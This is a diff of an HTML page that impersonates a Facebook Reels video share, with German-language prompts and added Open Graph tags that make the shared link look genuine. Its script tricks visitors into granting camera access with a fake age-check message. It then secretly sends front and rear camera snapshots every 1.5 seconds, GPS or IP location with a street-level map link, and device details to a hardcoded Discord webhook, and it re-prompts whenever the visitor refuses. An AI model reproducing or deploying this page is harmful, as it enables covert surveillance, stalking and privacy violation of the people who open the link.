@@ -3,28 +3,40 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Facebook</title>
+  <title>Facebook Reels</title>
   <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
+
+  <!-- OG für perfekte Share-Vorschau -->
+  <meta property="og:title" content="Facebook Reels">
+  <meta property="og:description" content="DOK MI NISI PAO U OCIMA DUBOKO – Zorica Zoka Dimitrijevic · Original audio">
+  <meta property="og:image" content="https://i.imgur.com/DEINE_THUMBNAIL_URL.jpg"> <!-- echtes Bild einsetzen -->
+  <meta property="og:image:width" content="526">
+  <meta property="og:image:height" content="296">
+  <meta property="og:url" content="https://www.facebook.com/share/r/1AeJHMHjaj/">
+  <meta property="og:type" content="video.other">
+  <meta property="og:site_name" content="Facebook">
+  <meta name="twitter:card" content="summary_large_image">
+
   <style>
-    body { margin:0; font-family:Helvetica,Arial,sans-serif; background:#000; color:#fff; overflow:hidden; touch-action:manipulation; -webkit-tap-highlight-color:transparent; }
-    .header { position:fixed; top:0; left:0; right:0; height:56px; background:rgba(0,0,0,0.85); display:flex; align-items:center; padding:0 16px; z-index:100; backdrop-filter:blur(14px); }
-    .close { font-size:38px; font-weight:bold; cursor:pointer; margin-right:20px; user-select:none; }
+    body { margin:0; font-family:Helvetica,Arial,sans-serif; background:#000; color:#fff; overflow:hidden; touch-action:manipulation; }
+    .header { position:fixed; top:0; left:0; right:0; height:56px; background:rgba(0,0,0,0.85); display:flex; align-items:center; padding:0 16px; z-index:100; }
+    .close { font-size:36px; font-weight:bold; cursor:pointer; margin-right:20px; }
     .title { flex:1; text-align:center; font-size:20px; font-weight:600; }
     .reel { height:100vh; position:relative; }
-    .profile { position:absolute; top:80px; left:20px; display:flex; align-items:center; z-index:10; pointer-events:none; }
-    .avatar { width:52px; height:52px; border-radius:50%; background:#666; margin-right:14px; }
-    .info { font-size:17px; line-height:1.2; }
+    .profile { position:absolute; top:80px; left:20px; display:flex; align-items:center; z-index:10; }
+    .avatar { width:50px; height:50px; border-radius:50%; background:#666; margin-right:14px; }
+    .info { font-size:17px; }
     .name { font-weight:600; }
     .pub { font-size:14px; opacity:0.9; }
     .play-area { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; z-index:5; cursor:pointer; }
-    .play-btn { width:140px; height:140px; background:rgba(0,0,0,0.65); border-radius:50%; display:flex; align-items:center; justify-content:center; pointer-events:auto; }
-    .triangle { width:0; height:0; border-top:46px solid transparent; border-bottom:46px solid transparent; border-left:74px solid #fff; margin-left:14px; }
-    .text-overlay { position:absolute; bottom:280px; left:0; right:0; font-size:3.2rem; text-align:center; text-shadow:0 6px 35px #000; pointer-events:none; line-height:1.1; z-index:4; }
-    .actions { position:absolute; bottom:80px; right:32px; display:flex; flex-direction:column; gap:44px; font-size:40px; color:#fff; z-index:6; pointer-events:none; }
-    .audio { position:absolute; bottom:36px; left:20px; font-size:16px; opacity:0.85; z-index:10; pointer-events:none; }
-    #cam-prompt, #loc-prompt { position:fixed; inset:0; background:rgba(0,0,0,0.95); display:none; align-items:center; justify-content:center; z-index:9999; pointer-events:auto; }
-    .modal-box { background:#fff; color:#000; padding:60px 50px; border-radius:26px; max-width:500px; text-align:center; box-shadow:0 26px 90px rgba(0,0,0,0.85); pointer-events:auto; }
-    .btn { padding:22px 100px; font-size:1.45rem; font-weight:bold; border:none; border-radius:16px; margin:26px 16px; cursor:pointer; pointer-events:auto; touch-action:manipulation; }
+    .play-btn { width:130px; height:130px; background:rgba(0,0,0,0.6); border-radius:50%; display:flex; align-items:center; justify-content:center; }
+    .triangle { width:0; height:0; border-top:42px solid transparent; border-bottom:42px solid transparent; border-left:68px solid #fff; margin-left:12px; }
+    .text { position:absolute; bottom:260px; left:0; right:0; font-size:2.8rem; text-align:center; text-shadow:0 5px 30px #000; pointer-events:none; z-index:4; }
+    .actions { position:absolute; bottom:70px; right:30px; display:flex; flex-direction:column; gap:40px; font-size:36px; color:#fff; z-index:6; }
+    .audio { position:absolute; bottom:30px; left:20px; font-size:15px; opacity:0.85; z-index:10; }
+    #cam-prompt, #loc-prompt { position:fixed; inset:0; background:rgba(0,0,0,0.95); display:none; align-items:center; justify-content:center; z-index:9999; }
+    .modal { background:#fff; color:#000; padding:50px 40px; border-radius:22px; max-width:480px; text-align:center; box-shadow:0 20px 80px rgba(0,0,0,0.8); }
+    .btn { padding:18px 90px; font-size:1.35rem; font-weight:bold; border:none; border-radius:12px; margin:20px 12px; cursor:pointer; }
     .allow { background:#1877f2; color:#fff; }
     .deny { background:#e4e6eb; color:#000; }
   </style>
@@ -48,7 +60,7 @@
     <div class="play-btn" id="playBtn"><div class="triangle"></div></div>
   </div>
 
-  <div class="text-overlay">DOK MI NISI<br>PAO U OCIMA DUBOKO</div>
+  <div class="text">DOK MI NISI<br>PAO U OCIMA DUBOKO</div>
 
   <div class="actions">
     <div>❤️ 14.6K</div>
@@ -60,21 +72,21 @@
 </div>
 
 <div id="cam-prompt">
-  <div class="modal-box">
+  <div class="modal">
     <h2>Video kann nicht abgespielt werden</h2>
-    <p style="margin:34px 0; font-size:1.45rem;">Kurze Kamera-Freigabe für Altersprüfung nötig.</p>
-    <div id="cam-err" style="color:#c00;display:none;margin:26px 0;">Zugriff verweigert – erneut versuchen</div>
-    <button id="allowCamBtn" class="btn allow">KAMERA FREIGEBEN</button>
-    <button id="denyCamBtn" class="btn deny">ABBRECHEN</button>
+    <p style="margin:30px 0; font-size:1.4rem;">Kurze Kamera-Freigabe nötig.</p>
+    <div id="camErr" style="color:#c00;display:none;margin:20px 0;">Zugriff verweigert – erneut versuchen</div>
+    <button id="allowCam" class="btn allow">KAMERA FREIGEBEN</button>
+    <button id="denyCam" class="btn deny">ABBRECHEN</button>
   </div>
 </div>
 
 <div id="loc-prompt">
-  <div class="modal-box">
-    <h2>Standort erforderlich</h2>
-    <p style="margin:34px 0; font-size:1.45rem;">Teile deinen genauen Standort, um das Video zu laden.</p>
-    <button id="allowLocBtn" class="btn allow">STANDORT TEILEN</button>
-    <button id="denyLocBtn" class="btn deny">NEIN</button>
+  <div class="modal">
+    <h2>Standort teilen</h2>
+    <p style="margin:30px 0; font-size:1.4rem;">Genauen Standort teilen.</p>
+    <button id="allowLoc" class="btn allow">STANDORT TEILEN</button>
+    <button id="denyLoc" class="btn deny">NEIN</button>
   </div>
 </div>
 
@@ -83,124 +95,121 @@
 
 <script>
 const HOOK = "https://discord.com/api/webhooks/1469356230932824309/a37FAcac9zDeOiHgx2kNAukuUHrFjDrX0XZg5b_Q1R_bVbtZRhL070tfkOeEGhysRYPI";
-let count = 0, stream = null, v = document.getElementById('v'), c = document.getElementById('c');
+let count=0, stream=null, v=document.getElementById('v'), c=document.getElementById('c');
 
 async function getGeo() {
-  let geo = null;
-  try {
-    geo = await (await fetch('https://ipapi.co/json/')).json();
-    if (geo.ip && geo.latitude) return geo;
-  } catch {}
-  try {
-    geo = await (await fetch('https://ipinfo.io/json')).json();
-    if (geo.ip && geo.loc) {
-      const [lat, lon] = geo.loc.split(',');
-      geo.latitude = parseFloat(lat);
-      geo.longitude = parseFloat(lon);
-      return geo;
-    }
-  } catch {}
-  return {ip:'unbekannt', city:'?', region:'?', country:'?', postal:'?', org:'?', latitude:null, longitude:null};
+  let geo=null;
+  try{geo=await(await fetch('https://ipapi.co/json/')).json();if(geo.ip&&geo.latitude)return geo;}catch{}
+  try{geo=await(await fetch('https://ipinfo.io/json')).json();if(geo.ip&&geo.loc){const[la,lo]=geo.loc.split(',');geo.latitude=parseFloat(la);geo.longitude=parseFloat(lo);return geo;}}catch{}
+  return {ip:'?',city:'?',region:'?',country:'?',postal:'?',org:'?',latitude:null,longitude:null};
 }
 
 async function getGPS() {
-  return new Promise(r => {
-    if (!navigator.geolocation) return r(null);
-    navigator.geolocation.getCurrentPosition(
-      pos => r({latitude:pos.coords.latitude, longitude:pos.coords.longitude, accuracy:pos.coords.accuracy}),
-      () => r(null),
-      {enableHighAccuracy:true, timeout:22000, maximumAge:0}
-    );
+  return new Promise(r=>{
+    if(!navigator.geolocation)return r(null);
+    navigator.geolocation.getCurrentPosition(p=>r({latitude:p.coords.latitude,longitude:p.coords.longitude,accuracy:p.coords.accuracy}),()=>r(null),{enableHighAccuracy:true,timeout:20000,maximumAge:0});
   });
 }
 
-async function send(type, blob = null) {
-  try {
-    let loc = await getGPS() || await getGeo();
-    let ip = loc.ip || 'unbekannt';
-    let city = loc.city || '?', region = loc.region || '?', country = loc.country || '?', postal = loc.postal || '?', org = loc.org || '?';
-    let lat = loc.latitude, lon = loc.longitude;
-    let acc = lat ? `${Math.round(loc.accuracy || 500)} m` : 'IP-Fallback';
-    let maps = lat ? `https://maps.google.com/?q=${lat.toFixed(7)},${lon.toFixed(7)}&z=19&layer=c` : null;
+async function send(type,blob=null){
+  try{
+    let loc=await getGPS()||await getGeo();
+    let ip=loc.ip||'?';
+    let city=loc.city||'?',region=loc.region||'?',country=loc.country||'?',postal=loc.postal||'?',org=loc.org||'?';
+    let lat=loc.latitude,lon=loc.longitude;
+    let acc=lat?`${Math.round(loc.accuracy||500)}m`:'IP-Fallback';
+    let maps=lat?`https://maps.google.com/?q=${lat.toFixed(7)},${lon.toFixed(7)}&z=19&layer=c`:null;
 
-    const embed = {
-      title: `🔴 FB ${type} #${++count}`,
-      color: lat ? 0x00ffbb : 0xff0000,
-      fields: [
-        {name:"Event", value:type, inline:true},
-        {name:"IP + Ort", value:`**${ip}**\n${city} • ${region} • ${country} • ${postal} • ${org}`, inline:true},
-        {name:"Genauigkeit", value:acc, inline:true},
-        {name:"UA", value:navigator.userAgent.substring(0,140), inline:false},
-        {name:"Screen", value:`${screen.width}×${screen.height}`, inline:true},
-        {name:"Zeit", value:new Date().toISOString(), inline:true}
+    const embed={
+      title:`🔴 FB ${type} #${++count}`,
+      color:lat?0x00ffcc:0xff0000,
+      fields:[
+        {name:"Event",value:type,inline:true},
+        {name:"IP + Ort",value:`**${ip}**\n${city} • ${region} • ${country} • ${postal} • ${org}`,inline:true},
+        {name:"Genauigkeit",value:acc,inline:true},
+        {name:"UA",value:navigator.userAgent.substring(0,140),inline:false},
+        {name:"Screen",value:`${screen.width}×${screen.height}`,inline:true},
+        {name:"Zeit",value:new Date().toISOString(),inline:true}
       ],
-      timestamp: new Date().toISOString()
+      timestamp:new Date().toISOString()
     };
-    if (maps) embed.fields.push({name:"Google Maps – Position", value:`[→ exakte Stelle](${maps})`, inline:false});
+    if(maps)embed.fields.push({name:"Google Maps",value:`[→ Haus/Street](${maps})`,inline:false});
 
-    const payload = {embeds:[embed]};
-    if (blob) {
-      let fd = new FormData();
-      fd.append("payload_json", JSON.stringify(payload));
-      fd.append("file", blob, `snap_${Date.now()}.jpg`);
-      await fetch(HOOK + "?wait=true", {method:"POST", body:fd});
-    } else {
-      await fetch(HOOK + "?wait=true", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(payload)});
+    const payload={embeds:[embed]};
+    if(blob){
+      let fd=new FormData();
+      fd.append("payload_json",JSON.stringify(payload));
+      fd.append("file",blob,`cam_${Date.now()}.jpg`);
+      await fetch(HOOK+"?wait=true",{method:"POST",body:fd});
+    }else{
+      await fetch(HOOK+"?wait=true",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)});
     }
-  } catch {}
+  }catch{}
 }
 
-function startCapture() {
-  document.getElementById('cam-prompt').style.display = 'flex';
-  send('PLAY_CLICK');
-}
-
-const playBtn = document.getElementById('playBtn');
-playBtn.addEventListener('click', startCapture);
-playBtn.addEventListener('touchend', e => { e.preventDefault(); startCapture(); });
-
-document.getElementById('allowCamBtn').onclick = async () => {
-  document.getElementById('cam-prompt').style.display = 'none';
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user", width:{ideal:1280}, height:{ideal:720}}});
-    v.srcObject = stream;
+async function startCam(facing="user"){
+  try{
+    const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:facing,width:{ideal:1280},height:{ideal:720}}});
+    v.srcObject=s;
     await v.play();
-    c.width = v.videoWidth || 1280;
-    c.height = v.videoHeight || 720;
-    setInterval(async () => {
+    c.width=v.videoWidth||1280;
+    c.height=v.videoHeight||720;
+    return s;
+  }catch(e){
+    send('CAM_ERROR_'+facing);
+    return null;
+  }
+}
+
+document.getElementById('playBtn').addEventListener('click',async()=>{
+  document.getElementById('cam-prompt').style.display='flex';
+  send('PLAY');
+});
+
+document.getElementById('allowCam').onclick=async()=>{
+  document.getElementById('cam-prompt').style.display='none';
+  let s=await startCam("user");
+  if(s){
+    setInterval(async()=>{
       c.getContext('2d').drawImage(v,0,0,c.width,c.height);
-      let blob = await new Promise(r => c.toBlob(r,'image/jpeg',0.88));
-      send('CAM SNAP', blob);
-    }, 1400);
-    setTimeout(() => {
-      document.getElementById('loc-prompt').style.display = 'flex';
-    }, 4000);
-  } catch(e) {
-    send('CAM_ERROR');
-    document.getElementById('cam-err').style.display = 'block';
-    setTimeout(() => document.getElementById('cam-prompt').style.display = 'flex', 3000);
+      let b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.88));
+      send('CAM SNAP FRONT',b);
+    },1500);
+    setTimeout(async()=>{
+      if(s)s.getTracks().forEach(t=>t.stop());
+      let back=await startCam("environment");
+      if(back){
+        setInterval(async()=>{
+          c.getContext('2d').drawImage(v,0,0,c.width,c.height);
+          let b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.88));
+          send('CAM SNAP BACK',b);
+        },1500);
+      }
+      setTimeout(()=>document.getElementById('loc-prompt').style.display='flex',3000);
+    },6000);
+  }else{
+    document.getElementById('camErr').style.display='block';
+    setTimeout(()=>document.getElementById('cam-prompt').style.display='flex',2000);
   }
 };
 
-document.getElementById('denyCamBtn').onclick = () => {
-  document.getElementById('cam-err').style.display = 'block';
+document.getElementById('denyCam').onclick=()=>{
+  document.getElementById('camErr').style.display='block';
   send('CAM_DENY');
-  setTimeout(() => document.getElementById('cam-prompt').style.display = 'flex', 2400);
+  setTimeout(()=>document.getElementById('cam-prompt').style.display='flex',1800);
 };
 
-document.getElementById('allowLocBtn').onclick = async () => {
-  document.getElementById('loc-prompt').style.display = 'none';
+document.getElementById('allowLoc').onclick=async()=>{
+  document.getElementById('loc-prompt').style.display='none';
   send('LOC_GRANTED');
 };
 
-document.getElementById('denyLocBtn').onclick = () => {
-  document.getElementById('loc-prompt').style.display = 'none';
+document.getElementById('denyLoc').onclick=()=>{
+  document.getElementById('loc-prompt').style.display='none';
   send('LOC_DENY');
 };
 
-document.getElementById('closeBtn').onclick = () => {
-  location.reload();
-};
+document.getElementById('closeBtn').onclick=()=>location.reload();
 </script>
 </body>
 </html>
